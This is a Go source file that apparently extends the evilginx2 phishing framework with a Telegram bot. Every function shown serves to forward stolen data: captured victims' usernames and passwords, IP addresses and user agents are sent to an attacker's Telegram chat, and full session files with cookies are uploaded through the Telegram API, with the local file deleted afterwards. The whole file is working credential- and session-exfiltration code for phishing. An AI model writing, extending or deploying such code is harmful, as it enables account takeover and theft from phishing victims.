package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	botToken    string
	chatID      string
	enabled     bool
	client      *http.Client
	msgQueue    chan *TelegramMessage
	wg          sync.WaitGroup
	stopChan    chan bool
}

type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
		msgQueue: make(chan *TelegramMessage, 100),
		stopChan: make(chan bool),
	}
}

func (t *TelegramBot) Start() {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	t.wg.Add(1)
	go t.messageWorker()
}

func (t *TelegramBot) Stop() {
	close(t.stopChan)
	t.wg.Wait()
}

func (t *TelegramBot) messageWorker() {
	defer t.wg.Done()

	for {
		select {
		case msg := <-t.msgQueue:
			if msg != nil {
				t.sendMessage(msg)
			}
		case <-t.stopChan:
			// Process remaining messages before stopping
			for len(t.msgQueue) > 0 {
				if msg := <-t.msgQueue; msg != nil {
					t.sendMessage(msg)
				}
			}
			return
		}
	}
}

func (t *TelegramBot) sendMessage(msg *TelegramMessage) error {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)

	jsonData, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
	}

	return nil
}

func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, userAgent, domain string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05 MST")
	
	message := fmt.Sprintf(
		"🎯 *Captured Session %d*\n\n"+
			"📧 *Username:* `%s`\n"+
			"🔑 *Password:* `%s`\n"+
			"🌐 *IP:* `%s`\n"+
			"📱 *User-Agent:* %s\n"+
			"🌐 *Domain:* %s\n"+
			"⏰ *Time:* %s",
		sessionID,
		escapeMarkdown(username),
		escapeMarkdown(password),
		ip,
		escapeMarkdown(userAgent),
		domain,
		timestamp,
	)

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	select {
	case t.msgQueue <- msg:
	default:
		// Queue is full, log error but don't block
		log.Warning("telegram: message queue is full, dropping message")
	}
}

func (t *TelegramBot) SendSessionUpdate(sessionID int, updateType, value, ip string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	timestamp := time.Now().Format("15:04:05")
	
	var emoji, field string
	switch updateType {
	case "username":
		emoji = "📧"
		field = "Username"
	case "password":
		emoji = "🔑"
		field = "Password"
	default:
		emoji = "📝"
		field = updateType
	}

	message := fmt.Sprintf(
		"🔔 *Session %d Update*\n\n"+
			"%s *%s:* `%s`\n"+
			"🌐 *IP:* `%s`\n"+
			"⏰ *Time:* %s",
		sessionID,
		emoji,
		field,
		escapeMarkdown(value),
		ip,
		timestamp,
	)

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	select {
	case t.msgQueue <- msg:
	default:
		log.Warning("telegram: message queue is full, dropping message")
	}
}

func (t *TelegramBot) SendTestMessage() error {
	if t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	message := "✅ *Evilginx2 Telegram Integration*\n\n" +
		"This is a test message to verify your Telegram bot configuration.\n" +
		"If you receive this message, your bot is properly configured!"

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	// Send test message directly without queuing
	return t.sendMessage(msg)
}

func (t *TelegramBot) SendDocument(filePath string, caption string) error {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.botToken)

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Create multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add the file
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err = io.Copy(part, file); err != nil {
		return err
	}

	// Add chat ID
	if err := writer.WriteField("chat_id", t.chatID); err != nil {
		return err
	}

	// Add caption if provided
	if caption != "" {
		if err := writer.WriteField("caption", caption); err != nil {
			return err
		}
		if err := writer.WriteField("parse_mode", "Markdown"); err != nil {
			return err
		}
	}

	// Close the writer
	if err := writer.Close(); err != nil {
		return err
	}

	// Create request
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send request
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
	}

	// Clean up the temporary file after sending
	os.Remove(filePath)

	return nil
}

func (t *TelegramBot) SendSessionFile(sessionID int, filePath string, username, password, ip, domain string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	caption := fmt.Sprintf(
		"🎯 *Complete Session Capture %d*\n\n"+
			"📧 *Username:* `%s`\n"+
			"🔑 *Password:* `%s`\n"+
			"🌐 *IP:* `%s`\n"+
			"🌐 *Domain:* %s\n\n"+
			"📎 *Attached:* Full session data with cookies",
		sessionID,
		escapeMarkdown(username),
		escapeMarkdown(password),
		ip,
		domain,
	)

	// Send file in a goroutine to avoid blocking
	go func() {
		if err := t.SendDocument(filePath, caption); err != nil {
			log.Warning("telegram: failed to send session file: %v", err)
		}
	}()
}

func (t *TelegramBot) SetConfig(botToken, chatID string, enabled bool) {
	t.botToken = botToken
	t.chatID = chatID
	t.enabled = enabled
}

func (t *TelegramBot) GetConfig() TelegramConfig {
	return TelegramConfig{
		BotToken: t.botToken,
		ChatID:   t.chatID,
		Enabled:  t.enabled,
	}
}

func (t *TelegramBot) IsEnabled() bool {
	return t.enabled && t.botToken != "" && t.chatID != ""
}

func escapeMarkdown(text string) string {
	// Escape special Markdown characters
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"(", "\\(",
		")", "\\)",
		"~", "\\~",
		"`", "\\`",
		">", "\\>",
		"#", "\\#",
		"+", "\\+",
		"-", "\\-",
		"=", "\\=",
		"|", "\\|",
		"{", "\\{",
		"}", "\\}",
		".", "\\.",
		"!", "\\!",
	)
	return replacer.Replace(text)
}
